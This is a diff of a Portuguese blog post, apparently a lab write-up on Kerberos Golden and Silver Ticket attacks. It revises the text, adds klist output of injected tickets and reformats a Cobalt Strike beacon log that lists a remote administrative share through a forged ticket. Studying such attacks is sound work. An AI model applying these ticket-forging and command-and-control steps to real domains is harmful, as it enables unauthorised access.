@@ -127,7 +127,7 @@ Credentials:
 
 <h3 id="silver-tickets">Silver Tickets</h3>
 
-<p>Silver Tickets seguem a mesma ideia do Golden Ticket, porém, forjado um TGS (Service Ticket) em vez do TGT. Os tickets são criados utilizando a conta do computador ou conta de serviço do recurso que o atacante deseja acessar. As informações sobre o usuário, grupo e etc podem ser forjadas sem a necessidade de nenhuma troca de informação entre User Workstation e KDC.</p>
+<p>Silver Tickets seguem a mesma ideia do Golden Ticket, porém, forjando um TGS (Service Ticket) em vez do TGT. Os tickets são criados utilizando a conta do computador ou conta de serviço do recurso que o atacante deseja acessar. As informações sobre o usuário, grupo e etc podem ser forjadas sem a necessidade de nenhuma troca de informação entre User Workstation e KDC.</p>
 
 <p><img src="https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/images/ges/st.png" alt="" /></p>
 
@@ -182,29 +182,61 @@ Lifetime  : 01/03/2020 18:39:26 ; 27/02/2030 18:39:26 ; 27/02/2030 18:39:26
  * KrbCred generated
 
 Golden ticket for '</span><span class="nx">admin</span><span class="w"> </span><span class="err">@</span><span class="w"> </span><span class="nx">hnr.local</span><span class="s1">' successfully submitted for current session
+</span></code></pre></div></div>
 
-beacon&gt; shell dir \\SQL.hnr.local\c$
-[*] Tasked beacon to run: dir \\SQL.hnr.local\c$
-[+] host called home, sent: 53 bytes
-[+] received output:
- Volume in drive \\SQL.hnr.local\c$ has no label.
- Volume Serial Number is 04AB-790B
+<p>Utilizando a ferramenta klist, podemos confirmar que os tickets injetados permanecem armazenados em cache.</p>
 
- Directory of \\SQL.hnr.local\c$
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">beacon</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">shell</span><span class="w"> </span><span class="nx">klist</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nf">Tasked</span><span class="w"> </span><span class="nx">beacon</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">run:</span><span class="w"> </span><span class="nx">klist</span><span class="w">
+</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="nf">host</span><span class="w"> </span><span class="nx">called</span><span class="w"> </span><span class="nx">home</span><span class="p">,</span><span class="w"> </span><span class="nx">sent:</span><span class="w"> </span><span class="nx">36</span><span class="w"> </span><span class="nx">bytes</span><span class="w">
+</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="nf">received</span><span class="w"> </span><span class="nx">output:</span><span class="w">
 
-01/03/2020  11:09    &lt;DIR&gt;          HNRDOCS
-15/09/2018  04:19    &lt;DIR&gt;          PerfLogs
-12/02/2020  17:07    &lt;DIR&gt;          Program Files
-12/02/2020  16:35    &lt;DIR&gt;          Program Files (x86)
-12/02/2020  15:34    &lt;DIR&gt;          SQLServer2017Media
-12/02/2020  15:53    &lt;DIR&gt;          Users
-01/03/2020  18:11    &lt;DIR&gt;          Windows
-               0 File(s)              0 bytes
-               7 Dir(s)  47.061.692.416 bytes free
+</span><span class="nf">Current</span><span class="w"> </span><span class="nx">LogonId</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">0:0x51f1d</span><span class="w">
 
+</span><span class="c">#0&gt;	Client: jbolsonaro @ HNR.LOCAL</span><span class="w">
+	</span><span class="nf">Server:</span><span class="w"> </span><span class="nx">krbtgt/HNR.LOCAL</span><span class="w"> </span><span class="err">@</span><span class="w"> </span><span class="nx">HNR.LOCAL</span><span class="w">
+	</span><span class="nf">KerbTicket</span><span class="w"> </span><span class="nx">Encryption</span><span class="w"> </span><span class="nx">Type:</span><span class="w"> </span><span class="nx">AES-256-CTS-HMAC-SHA1-96</span><span class="w">
+	</span><span class="nf">Ticket</span><span class="w"> </span><span class="nx">Flags</span><span class="w"> </span><span class="nx">0x60a10000</span><span class="w"> </span><span class="nf">-</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">forwardable</span><span class="w"> </span><span class="nx">forwarded</span><span class="w"> </span><span class="nx">renewable</span><span class="w"> </span><span class="nx">pre_authent</span><span class="w"> </span><span class="nx">name_canonicalize</span><span class="w"> 
+	</span><span class="nx">Start</span><span class="w"> </span><span class="nx">Time:</span><span class="w"> </span><span class="nx">3/2/2020</span><span class="w"> </span><span class="nx">13:56:50</span><span class="w"> </span><span class="p">(</span><span class="nf">local</span><span class="p">)</span><span class="w">
+	</span><span class="kr">End</span><span class="w"> </span><span class="nf">Time:</span><span class="w">   </span><span class="nx">3/2/2020</span><span class="w"> </span><span class="nx">23:41:06</span><span class="w"> </span><span class="p">(</span><span class="nf">local</span><span class="p">)</span><span class="w">
+	</span><span class="nf">Renew</span><span class="w"> </span><span class="nx">Time:</span><span class="w"> </span><span class="nx">3/8/2020</span><span class="w"> </span><span class="nx">18:11:06</span><span class="w"> </span><span class="p">(</span><span class="nf">local</span><span class="p">)</span><span class="w">
+	</span><span class="nf">Session</span><span class="w"> </span><span class="nx">Key</span><span class="w"> </span><span class="nx">Type:</span><span class="w"> </span><span class="nx">AES-256-CTS-HMAC-SHA1-96</span><span class="w">
+	</span><span class="nf">Cache</span><span class="w"> </span><span class="nx">Flags:</span><span class="w"> </span><span class="nx">0x2</span><span class="w"> </span><span class="nf">-</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">DELEGATION</span><span class="w"> 
+	</span><span class="nx">Kdc</span><span class="w"> </span><span class="nx">Called:</span><span class="w"> </span><span class="nx">GOKU.hnr.local</span><span class="w">
+
+</span><span class="c">#1&gt;	Client: jbolsonaro @ HNR.LOCAL</span><span class="w">
+	</span><span class="nf">Server:</span><span class="w"> </span><span class="nx">host/sql.hnr.local</span><span class="w"> </span><span class="err">@</span><span class="w"> </span><span class="nx">HNR.LOCAL</span><span class="w">
+	</span><span class="nf">KerbTicket</span><span class="w"> </span><span class="nx">Encryption</span><span class="w"> </span><span class="nx">Type:</span><span class="w"> </span><span class="nx">AES-256-CTS-HMAC-SHA1-96</span><span class="w">
+	</span><span class="nf">Ticket</span><span class="w"> </span><span class="nx">Flags</span><span class="w"> </span><span class="nx">0x40a10000</span><span class="w"> </span><span class="nf">-</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">forwardable</span><span class="w"> </span><span class="nx">renewable</span><span class="w"> </span><span class="nx">pre_authent</span><span class="w"> </span><span class="nx">name_canonicalize</span><span class="w"> 
+	</span><span class="nx">Start</span><span class="w"> </span><span class="nx">Time:</span><span class="w"> </span><span class="nx">3/1/2020</span><span class="w"> </span><span class="nx">18:11:06</span><span class="w"> </span><span class="p">(</span><span class="nf">local</span><span class="p">)</span><span class="w">
+	</span><span class="kr">End</span><span class="w"> </span><span class="nf">Time:</span><span class="w">   </span><span class="nx">3/2/2020</span><span class="w"> </span><span class="nx">4:11:06</span><span class="w"> </span><span class="p">(</span><span class="nf">local</span><span class="p">)</span><span class="w">
+	</span><span class="nf">Renew</span><span class="w"> </span><span class="nx">Time:</span><span class="w"> </span><span class="nx">3/8/2020</span><span class="w"> </span><span class="nx">18:11:06</span><span class="w"> </span><span class="p">(</span><span class="nf">local</span><span class="p">)</span><span class="w">
+	</span><span class="nf">Session</span><span class="w"> </span><span class="nx">Key</span><span class="w"> </span><span class="nx">Type:</span><span class="w"> </span><span class="nx">AES-256-CTS-HMAC-SHA1-96</span><span class="w">
+	</span><span class="nf">Cache</span><span class="w"> </span><span class="nx">Flags:</span><span class="w"> </span><span class="nx">0</span><span class="w"> 
+	</span><span class="nf">Kdc</span><span class="w"> </span><span class="nx">Called:</span><span class="w"> </span><span class="nx">GOKU.hnr.local</span><span class="w">
 </span></code></pre></div></div>
 
 <p>Como pode-se notar, após submeter o Silver Ticket na sessão para o serviço <a href="https://pt.wikipedia.org/wiki/Server_Message_Block">CIFS</a>, o acesso ao compartilhamento foi concedido, demonstrando a perfeita execução do ataque.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">beacon</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">shell</span><span class="w"> </span><span class="nx">dir</span><span class="w"> </span><span class="nx">\\SQL.hnr.local\c</span><span class="err">$</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nf">Tasked</span><span class="w"> </span><span class="nx">beacon</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">run:</span><span class="w"> </span><span class="nx">dir</span><span class="w"> </span><span class="nx">\\SQL.hnr.local\c</span><span class="err">$</span><span class="w">
+</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="nf">host</span><span class="w"> </span><span class="nx">called</span><span class="w"> </span><span class="nx">home</span><span class="p">,</span><span class="w"> </span><span class="nx">sent:</span><span class="w"> </span><span class="nx">53</span><span class="w"> </span><span class="nx">bytes</span><span class="w">
+</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="nf">received</span><span class="w"> </span><span class="nx">output:</span><span class="w">
+ </span><span class="nf">Volume</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">drive</span><span class="w"> </span><span class="nx">\\SQL.hnr.local\c</span><span class="err">$</span><span class="w"> </span><span class="nx">has</span><span class="w"> </span><span class="nx">no</span><span class="w"> </span><span class="nx">label.</span><span class="w">
+ </span><span class="nf">Volume</span><span class="w"> </span><span class="nx">Serial</span><span class="w"> </span><span class="nx">Number</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">04AB-790B</span><span class="w">
+
+ </span><span class="nf">Directory</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">\\SQL.hnr.local\c</span><span class="err">$</span><span class="w">
+
+</span><span class="mi">01</span><span class="nf">/03/2020</span><span class="w">  </span><span class="nx">11:09</span><span class="w">    </span><span class="err">&lt;</span><span class="nx">DIR</span><span class="err">&gt;</span><span class="w">          </span><span class="nx">HNRDOCS</span><span class="w">
+</span><span class="mi">15</span><span class="nf">/09/2018</span><span class="w">  </span><span class="nx">04:19</span><span class="w">    </span><span class="err">&lt;</span><span class="nx">DIR</span><span class="err">&gt;</span><span class="w">          </span><span class="nx">PerfLogs</span><span class="w">
+</span><span class="mi">12</span><span class="nf">/02/2020</span><span class="w">  </span><span class="nx">17:07</span><span class="w">    </span><span class="err">&lt;</span><span class="nx">DIR</span><span class="err">&gt;</span><span class="w">          </span><span class="nx">Program</span><span class="w"> </span><span class="nx">Files</span><span class="w">
+</span><span class="mi">12</span><span class="nf">/02/2020</span><span class="w">  </span><span class="nx">16:35</span><span class="w">    </span><span class="err">&lt;</span><span class="nx">DIR</span><span class="err">&gt;</span><span class="w">          </span><span class="nx">Program</span><span class="w"> </span><span class="nx">Files</span><span class="w"> </span><span class="p">(</span><span class="nf">x86</span><span class="p">)</span><span class="w">
+</span><span class="mi">12</span><span class="nf">/02/2020</span><span class="w">  </span><span class="nx">15:34</span><span class="w">    </span><span class="err">&lt;</span><span class="nx">DIR</span><span class="err">&gt;</span><span class="w">          </span><span class="nx">SQLServer2017Media</span><span class="w">
+</span><span class="mi">12</span><span class="nf">/02/2020</span><span class="w">  </span><span class="nx">15:53</span><span class="w">    </span><span class="err">&lt;</span><span class="nx">DIR</span><span class="err">&gt;</span><span class="w">          </span><span class="nx">Users</span><span class="w">
+</span><span class="mi">01</span><span class="nf">/03/2020</span><span class="w">  </span><span class="nx">18:11</span><span class="w">    </span><span class="err">&lt;</span><span class="nx">DIR</span><span class="err">&gt;</span><span class="w">          </span><span class="nx">Windows</span><span class="w">
+               </span><span class="mi">0</span><span class="w"> </span><span class="nf">File</span><span class="p">(</span><span class="nf">s</span><span class="p">)</span><span class="w">              </span><span class="mi">0</span><span class="w"> </span><span class="nf">bytes</span><span class="w">
+               </span><span class="mi">7</span><span class="w"> </span><span class="nf">Dir</span><span class="p">(</span><span class="nf">s</span><span class="p">)</span><span class="w">  </span><span class="mf">47.061.692.416</span><span class="w"> </span><span class="nf">bytes</span><span class="w"> </span><span class="nx">free</span><span class="w">
+</span></code></pre></div></div>
 
 <p>O intuito dos posts é se fazer entender como funcionam os ataques. As ferramentas apresentadas são apenas meios para que possamos alcançar um objetivo. Espero que tenha conseguido passar com clareza todas as informações necessárias para o entendimento e sanar quaisquer dúvidas. Caso eu tenha pecado em algo, ou alguma informação não teve embasamento necessário para seu entendimento, por favor entre em contato comigo, ficarei extramente feliz em ajudar.</p>
 
@@ -217,7 +249,7 @@ beacon&gt; shell dir \\SQL.hnr.local\c$
   </div>
 
   <div class="date">
-    Written on February 26, 2020
+    Written on March  2, 2020
   </div>
 
   
